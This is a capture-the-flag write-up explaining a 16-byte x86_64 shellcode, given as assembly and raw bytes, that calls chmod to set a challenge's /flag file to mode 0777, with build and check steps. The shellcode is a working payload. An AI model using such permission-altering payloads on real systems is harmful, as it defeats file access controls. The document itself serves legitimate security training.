# Write-Up: Shellcode Challenge - Changing /flag Permissions

## Challenge Overview
The challenge required creating shellcode that changes the permissions of the `/flag` file to make it accessible. The key constraints were:
- Shellcode size must be ≤ 18 bytes
- Must modify `/flag` file permissions

## Solution Approach

### Technical Analysis
The solution uses x86_64 assembly to call the `chmod` system call:
- **chmod syscall number**: 90 (0x5a)
- **Target permissions**: 0777 (0x1ff) - read/write/execute for all users
- **File path**: `/flag` (executed from root directory)

### Shellcode Used
```nasm
section .text
    global _start

_start:
    push 0x67616c66     ; Push "flag" string onto stack
    mov rdi, rsp        ; RDI = pointer to filename
    mov si, 0x1ff       ; SI = permissions (0777)
    mov al, 90          ; AL = chmod syscall number
    syscall             ; Execute system call
```

**Shellcode bytes**: `\x68\x66\x6c\x61\x67\x48\x89\xe7\x66\xbe\xff\x01\xb0\x5a\x0f\x05` (16 bytes)

### Key Insights
1. **Relative Path Trick**: By running the shellcode from `/` directory, we can use just "flag" instead of "/flag", saving 1 byte
2. **Stack-Based String**: Pushing the string directly onto the stack avoids separate data sections
3. **Register Optimization**: Using smaller registers (AL, SI) instead of full 64-bit registers saves space
4. **Minimal Syscall Setup**: Only setting necessary registers for the chmod call

### Execution Steps
1. **Compile the shellcode**:
   ```bash
   nasm -f elf64 shellcode.asm
   ld -o shellcode shellcode.o
   ```

2. **Navigate to root directory**:
   ```bash
   cd /
   ```

3. **Execute the shellcode** (implementation-dependent on the challenge platform)

### Why This Works
- The shellcode is position-independent
- Using relative path "flag" works when executed from `/` directory
- chmod(0777) makes the file accessible regardless of original permissions
- 16-byte size comfortably meets the 18-byte constraint

### Verification
After execution, verify permissions were changed:
```bash
ls -la /flag
```
Expected output should show `-rwxrwxrwx` permissions.

## Conclusion
This solution demonstrates efficient shellcode writing by leveraging execution context and minimal syscall invocation. The 16-byte implementation successfully changes `/flag` permissions while staying well under the size constraint, making it suitable for exploitation scenarios where space is limited.
